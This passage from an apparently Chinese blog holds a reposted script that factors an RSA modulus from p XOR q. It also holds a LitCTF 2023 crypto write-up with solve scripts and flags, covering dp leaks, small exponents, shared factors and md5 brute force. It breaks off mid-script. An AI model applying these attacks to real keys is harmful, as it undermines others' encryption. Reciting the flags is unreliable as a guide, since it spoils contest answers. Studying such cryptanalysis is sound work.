      <a href="/2023/06/03/%E5%B7%B2%E7%9F%A5p-q%E5%BC%82%E6%88%96%E5%92%8C%E4%B9%98%E7%A7%AF%E5%88%86%E8%A7%A3n/" class="article-date">
  <time datetime="2023-06-03T14:36:33.000Z" itemprop="datePublished">2023-06-03</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/crypto/">crypto</a> / <a class="article-category-link" href="/categories/crypto/RSA/">RSA</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <p><a target="_blank" rel="noopener" href="https://github.com/sliedes/xor_factor/blob/master/xor_factor.py">https://github.com/sliedes/xor_factor/blob/master/xor_factor.py</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_cong</span>(<span class="params">k, p, q, n, xored=<span class="literal">None</span></span>):</span><br><span class="line">    kmask = (<span class="number">1</span> &lt;&lt; k) - <span class="number">1</span></span><br><span class="line">    p &amp;= kmask</span><br><span class="line">    q &amp;= kmask</span><br><span class="line">    n &amp;= kmask</span><br><span class="line">    pqm = (p*q) &amp; kmask</span><br><span class="line">    <span class="keyword">return</span> pqm == n <span class="keyword">and</span> (xored <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> (p^q) == (xored &amp; kmask))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extend</span>(<span class="params">k, a</span>):</span><br><span class="line">    kbit = <span class="number">1</span> &lt;&lt; (k-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">assert</span> a &lt; kbit</span><br><span class="line">    <span class="keyword">yield</span> a</span><br><span class="line">    <span class="keyword">yield</span> a | kbit</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factor</span>(<span class="params">n, p_xor_q</span>):</span><br><span class="line">    tracked = <span class="built_in">set</span>([(p, q) <span class="keyword">for</span> p <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">1</span>] <span class="keyword">for</span> q <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">                   <span class="keyword">if</span> check_cong(<span class="number">1</span>, p, q, n, p_xor_q)])</span><br><span class="line"></span><br><span class="line">    PRIME_BITS = <span class="built_in">int</span>(math.ceil(math.log(n, <span class="number">2</span>)/<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    maxtracked = <span class="built_in">len</span>(tracked)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, PRIME_BITS+<span class="number">1</span>):</span><br><span class="line">        newset = <span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">for</span> tp, tq <span class="keyword">in</span> tracked:</span><br><span class="line">            <span class="keyword">for</span> newp_ <span class="keyword">in</span> extend(k, tp):</span><br><span class="line">                <span class="keyword">for</span> newq_ <span class="keyword">in</span> extend(k, tq):</span><br><span class="line">                    <span class="comment"># Remove symmetry</span></span><br><span class="line">                    newp, newq = <span class="built_in">sorted</span>([newp_, newq_])</span><br><span class="line">                    <span class="keyword">if</span> check_cong(k, newp, newq, n, p_xor_q):</span><br><span class="line">                        newset.add((newp, newq))</span><br><span class="line"></span><br><span class="line">        tracked = newset</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(tracked) &gt; maxtracked:</span><br><span class="line">            maxtracked = <span class="built_in">len</span>(tracked)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Tracked set size: &#123;&#125; (max=&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(tracked), maxtracked))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># go through the tracked set and pick the correct (p, q)</span></span><br><span class="line">    <span class="keyword">for</span> p, q <span class="keyword">in</span> tracked:</span><br><span class="line">        <span class="keyword">if</span> p != <span class="number">1</span> <span class="keyword">and</span> p*q == n:</span><br><span class="line">            <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> <span class="literal">False</span>, <span class="string">&#x27;factors were not in tracked set. Is your p^q correct?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Usage: xor_factor.py n p_xor_q&#x27;</span>, file=sys.stderr)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;(give both numbers in decimal)&#x27;</span>, file=sys.stderr)</span><br><span class="line"></span><br><span class="line">    n = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">    p_xor_q = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">    p, q = factor(n, p_xor_q)</span><br><span class="line">    <span class="built_in">print</span>(p)</span><br><span class="line">    <span class="built_in">print</span>(q)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%88%86%E8%A7%A3n/" rel="tag">分解n</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-LitCTF2023"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/05/15/LitCTF2023/"
    >LitCTF2023</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/05/15/LitCTF2023/" class="article-date">
  <time datetime="2023-05-14T16:17:31.000Z" itemprop="datePublished">2023-05-15</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/match/">match</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <p>AK赛</p>
<p>这里只有密码的wp</p>
<p>rank:2</p>
<h1 id="Hex？Hex！"><a href="#Hex？Hex！" class="headerlink" title="Hex？Hex！"></a>Hex？Hex！</h1><p>直接十六进制转字符串</p>
<p><img src="/2023/05/15/LitCTF2023/image-20230513111930579.png" alt="image-20230513111930579"></p>
<p>LitCTF{tai111coollaaa!}</p>
<h1 id="梦想是红色的"><a href="#梦想是红色的" class="headerlink" title="梦想是红色的"></a>梦想是红色的</h1><p>核心价值观编码</p>
<p><img src="/2023/05/15/LitCTF2023/image-20230513112102874.png" alt="image-20230513112102874"></p>
<p>LitCTF{为之则易,不为则难}</p>
<h1 id="factordb"><a href="#factordb" class="headerlink" title="factordb"></a>factordb</h1><p>直接分解n求RSA</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">87924348264132406875276140514499937145050893665602592992418171647042491658461</span></span><br><span class="line">c = <span class="number">87677652386897749300638591365341016390128692783949277305987828177045932576708</span></span><br><span class="line">p=<span class="number">319576316814478949870590164193048041239</span></span><br><span class="line">q=<span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># LitCTF&#123;factordb!!!&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="家人们！谁懂啊，RSA签到都不会"><a href="#家人们！谁懂啊，RSA签到都不会" class="headerlink" title="家人们！谁懂啊，RSA签到都不会"></a>家人们！谁懂啊，RSA签到都不会</h1><p>简单RSA</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">12567387145159119014524309071236701639759988903138784984758783651292440613056150667165602473478042486784826835732833001151645545259394365039352263846276073</span></span><br><span class="line">q = <span class="number">12716692565364681652614824033831497167911028027478195947187437474380470205859949692107216740030921664273595734808349540612759651241456765149114895216695451</span></span><br><span class="line">c = <span class="number">108691165922055382844520116328228845767222921196922506468663428855093343772017986225285637996980678749662049989519029385165514816621011058462841314243727826941569954125384522233795629521155389745713798246071907492365062512521474965012924607857440577856404307124237116387085337087671914959900909379028727767057</span></span><br><span class="line">n=p*q</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># LitCTF&#123;it_is_easy_to_solve_question_when_you_know_p_and_q&#125;</span></span><br></pre></td></tr></table></figure>



<h1 id="yafu"><a href="#yafu" class="headerlink" title="yafu"></a>yafu</h1><p>可以直接用sage  euler_phi(n)来求phi</p>
<p>sage</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">15241208217768849887180010139590210767831431018204645415681695749294131435566140166245881287131522331092026252879324931622292179726764214435307</span></span><br><span class="line">c = <span class="number">12608550100856399369399391849907846147170257754920996952259023159548789970041433744454761458030776176806265496305629236559551086998780836655717</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi=euler_phi(n)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># LitCTF&#123;Mu1tiple_3m4ll_prim5_fac7ors_@re_uns4f5&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="P-Leak"><a href="#P-Leak" class="headerlink" title="P_Leak"></a>P_Leak</h1><p>dp泄露直接套脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">dp= <span class="number">5892502924236878675675338970704766304539618343869489297045857272605067962848952532606770917225218534430490745895652561015493032055636004130931491316020329</span></span><br><span class="line">n= <span class="number">50612159190225619689404794427464916374543237300894011803225784470008992781409447214236779975896311093686413491163221778479739252804271270231391599602217675895446538524670610623369953168412236472302812808639218392319634397138871387898452935081756580084070333246950840091192420542761507705395568904875746222477</span></span><br><span class="line">c= <span class="number">39257649468514605476432946851710016346016992413796229928386230062780829495844059368939749930876895443279723032641876662714088329296631207594999580050131450251288839714711436117326769029649419789323982613380617840218087161435260837263996287628129307328857086987521821533565738409794866606381789730458247531619</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">65535</span>):</span><br><span class="line">    p=(dp*e-<span class="number">1</span>)//i+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> n%p==<span class="number">0</span>:</span><br><span class="line">        q=n//p</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line">phi_n= (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi_n)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">flag=libnum.n2s(<span class="built_in">int</span>(m)).decode()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># LitCTF&#123;Prim3_1s_Le@k!!!!!&#125;</span></span><br></pre></td></tr></table></figure>



<h1 id="easy-math"><a href="#easy-math" class="headerlink" title="easy_math"></a>easy_math</h1><p>直接解方程</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">2230791374046346835775433548641067593691369485828070649075162141394476183565187654365131822111419512477883295758461313983481545182887415447403634720326639070667688614534290859200753589300443797</span></span><br><span class="line">c = <span class="number">2168563038335029902089976057856861885635845445863841607485310134441400500612435296818745930370268060353437465666224400129105788787423156958336380480503762222278722770240792709450637433509537280</span></span><br><span class="line">hint = <span class="number">392490868359411675557103683163021977774935163924606169241731307258226973701652855448542714274348304997416149742779376023311152228735117186027560227613656229190807480010615064372521942836446425717660375242197759811804760170129768647414717571386950790115746414735411766002368288743086845078803312201707960465419405926186622999423245762570917629351110970429987377475979058821154568001902541710817731089463915930932142007312230897818177067675996751110894377356758932</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"></span><br><span class="line">p=sympy.Symbol(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">q=sympy.Symbol(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line">f1=p*q-n</span><br><span class="line">f2=p**<span class="number">3</span>-q**<span class="number">5</span> -hint</span><br><span class="line">result=sympy.solve([f1,f2],[p,q])</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">p=<span class="number">7321664971326604351487965655099805117568571010588695608389113791312918573783115429227542573780838065461696504325762281209452761930184231131129306271846427</span></span><br><span class="line">q=<span class="number">304683618109085947723284393392507415311</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment">#LitCTF&#123;f9fab7522253e44b48824e914d0801ba&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="e的学问"><a href="#e的学问" class="headerlink" title="e的学问"></a>e的学问</h1><p>e和phi不互素直接套脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">e=<span class="number">74</span></span><br><span class="line">p= <span class="number">86053582917386343422567174764040471033234388106968488834872953625339458483149</span></span><br><span class="line">q= <span class="number">72031998384560188060716696553519973198388628004850270102102972862328770104493</span></span><br><span class="line">c= <span class="number">3939634105073614197573473825268995321781553470182462454724181094897309933627076266632153551522332244941496491385911139566998817961371516587764621395810123</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当e约去公约数后与phi互素</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">p, q, e, c</span>):</span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    t = gmpy2.gcd(e, phi)</span><br><span class="line">    d = gmpy2.invert(e // t, phi)</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line">    msg = gmpy2.iroot(m, t)</span><br><span class="line">    <span class="built_in">print</span>(msg)</span><br><span class="line">    <span class="keyword">if</span> msg[<span class="number">1</span>]:</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(msg[<span class="number">0</span>]))</span><br><span class="line">decrypt(p, q, e, c)</span><br><span class="line"><span class="comment">#LitCTF&#123;e_1s_n0t_@_Prime&#125;</span></span><br></pre></td></tr></table></figure>



<h1 id="原来你也玩原神"><a href="#原来你也玩原神" class="headerlink" title="原来你也玩原神"></a>原来你也玩原神</h1><p><img src="/2023/05/15/LitCTF2023/image-20230513131736538.png" alt="image-20230513131736538"></p>
<p><img src="/2023/05/15/LitCTF2023/image-20230513132513174.png" alt="image-20230513132513174"></p>
<p>对照即可</p>
<p>{yuanlainiyewanyuanshenwww}</p>
<p>转化为大写</p>
<p>NSSCTF{YUANLAINIYEWANYUANSHENWWW}</p>
<h1 id="你是我的关键词-Keyworld"><a href="#你是我的关键词-Keyworld" class="headerlink" title="你是我的关键词(Keyworld)"></a>你是我的关键词(Keyworld)</h1><p>根据题目名称直接手撸</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IFRURC&#123;X0S_YP3_JX_HBXV0PA&#125;</span><br><span class="line">LITCTF&#123;Y0U_AR3_MY_KEYW0RD&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Is-this-only-base"><a href="#Is-this-only-base" class="headerlink" title="Is this only base?"></a>Is this only base?</h1><p>SWZxWl&#x3D;F&#x3D;DQef0hlEiSUIVh9ESCcMFS9NF2NXFzM</p>
<p>栅栏23栏</p>
<p>SWZxWlFDe0liUV9ScF9FNFMzX2NSMCEhISEhfQ&#x3D;&#x3D;</p>
<p>base64</p>
<p>IfqZQC{IbQ_Rp_E4S3_cR0!!!!!}</p>
<p>凯撒</p>
<p>LitCTF{LeT_Us_H4V3_fU0!!!!!}</p>
<h1 id="md5的破解"><a href="#md5的破解" class="headerlink" title="md5的破解"></a>md5的破解</h1><p>直接上脚本了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">c=string.digits+string.ascii_lowercase</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> c:</span><br><span class="line">        <span class="keyword">for</span> o <span class="keyword">in</span> c:</span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> c:</span><br><span class="line">                flag=<span class="string">&#x27;LitCTF&#123;md5can&#x27;</span>+i+j+<span class="string">&#x27;3de&#x27;</span>+o+<span class="string">&#x27;rypt213thoughcr&#x27;</span>+p+<span class="string">&#x27;sh&#125;&#x27;</span></span><br><span class="line">                <span class="keyword">if</span>  md5(flag.encode()).hexdigest() == <span class="string">&#x27;496603d6953a15846cd7cc476f146771&#x27;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(flag)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"><span class="comment">#LitCTF&#123;md5can123dexrypt213thoughcrpsh&#125;</span></span><br></pre></td></tr></table></figure>



<h1 id="The-same-common-divisor"><a href="#The-same-common-divisor" class="headerlink" title="The same common divisor"></a>The same common divisor</h1><p>利用公因数求p，然后RSA</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n1= <span class="number">9852079772293301283705208653824307027320071498525390578148444258198605733768947108049676831872672654449631852459503049139275329796717506126689710613873813880735666507857022786447784753088176997374711523987152412069255685005264853118880922539048290400078105858759506186417678959028622484823376958194324034590514104266608644398160457382895380141070373685334979803658172378382884352616985632157233900719194944197689860219335238499593658894630966428723660931647038577670614850305719449893199713589368780231046895222526070730152875112477675102652862254926169713030701937231206405968412044029177246460558028793385980934233</span></span><br><span class="line">n3= <span class="number">4940268030889181135441311597961813780480775970170156650560367030148383674257975796516865571557828263935532335958510269356443566533284856608454193676600884849913964971291145182724888816164723930966472329604608512023988191536173112847915884014445539739070437180314205284883149421228744714989392788108329929896637182055266508625177260492776962915873036873839946591259443753924970795669864031580632650140641456386202636466624658715315856453572441182758855085077441336516178544978457053552156714181607801760605521338788424464551796638531143900048375037218585999440622490119344971822707261432953755569507740550277088437182</span></span><br><span class="line">c1= <span class="number">7066425618980522033304943700150361912772559890076173881522840300333719222157667104461410726444725540513601550570478331917063911791020088865705346188662290524599499769112250751103647749860198318955619903728724860941709527724500004142950768744200491448875522031555564384426372047270359602780292587644737898593450148108629904854675417943165292922990980758572264063039172969633878015560735737699147707712154627358077477591293746136250207139049702201052305840453700782016480965369600667516646007546442708862429431724013679189842300429421340122052682391471347471758814138218632022564279296594279507382548264409296929401260</span></span><br><span class="line">c2= <span class="number">854668035897095127498890630660344701894030345838998465420605524714323454298819946231147930930739944351187708040037822108105697983018529921300277486094149269105712677374751164879455815185393395371001495146490416978221501351569800028842842393448555836910486037183218754013655794027528039329299851644787006463456162952383099752894635657833907958930587328480492546831654755627949756658554724024525108575961076341962292900510328611128404001877137799465932130220386963518903892403159969133882215092783063943679288192557384595152566356483424061922742307738886179947575613661171671781544283180451958232826666741028590085269</span></span><br><span class="line">n2=n3^n1</span><br><span class="line">p=gmpy2.gcd(n1,n2)</span><br><span class="line">q1=n1//p</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c1,d,n1)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># LitCTF&#123;TH3_Tw0_nUmb3rs_H@v3_The_sAme_D1v1s0r!!&#125;</span></span><br></pre></td></tr></table></figure>



<h1 id="Where-is-P"><a href="#Where-is-P" class="headerlink" title="Where is P?"></a>Where is P?</h1><p>首先低指加密求出P	</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">n= <span class="number">24479907029118467064460793139240403258697681144532146836881997837526487637306591893357774423547391867013441147680031968367449693796015901951120514250935018725570026327610524687128709707340727799633444550317834481416507364804274266363478822257132586592232042108076935945436358397787891169163821061005102693505011197453089873909085170776511350713452580692963748763166981047023704528272230392479728897831538235554137129584665886878574314566549330671483636900134584707867654841021494106881794644469229030140144595938886437242375435914268001721437309283611088568191856208951867342004280893021653793820874747638264412653721</span></span><br><span class="line">a= <span class="number">22184346235325197613876257964606959796734210361241668065837491428527234174610482874427139453643569493268653377061231169173874401139203757698022691973395609028489121048788465356158531144787135876251872262389742175830840373281181905217510352227396545981674450409488394636498629147806808635157820030290630290808150235068140864601098322473572121965126109735529553247807211711005936042322910065304489093415276688746634951081501428768318098925390576594162098506572668709475140964400043947851427774550253257759990959997691631511262768785787474750441024242552456956598974533625095249106992723798354594261566983135394923063605</span></span><br><span class="line">e=<span class="number">3</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">c, e, n</span>):</span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        mm = c + n*k</span><br><span class="line">        result, flag = gmpy2.iroot(mm, e)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">True</span> == flag:</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">P=de(a,e,n)</span><br><span class="line"><span class="number">66302204855869216148926460265779698576660998574555407124043768605865908069722142097621926304390549253688814246272903647124801382742681337653915017783954290069842646020090511605930590064443141710086879668946</span></span><br></pre></td></tr></table></figure>

<p>然后就是p得高位攻击</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n=<span class="number">24479907029118467064460793139240403258697681144532146836881997837526487637306591893357774423547391867013441147680031968367449693796015901951120514250935018725570026327610524687128709707340727799633444550317834481416507364804274266363478822257132586592232042108076935945436358397787891169163821061005102693505011197453089873909085170776511350713452580692963748763166981047023704528272230392479728897831538235554137129584665886878574314566549330671483636900134584707867654841021494106881794644469229030140144595938886437242375435914268001721437309283611088568191856208951867342004280893021653793820874747638264412653721</span></span><br><span class="line">p_fake=<span 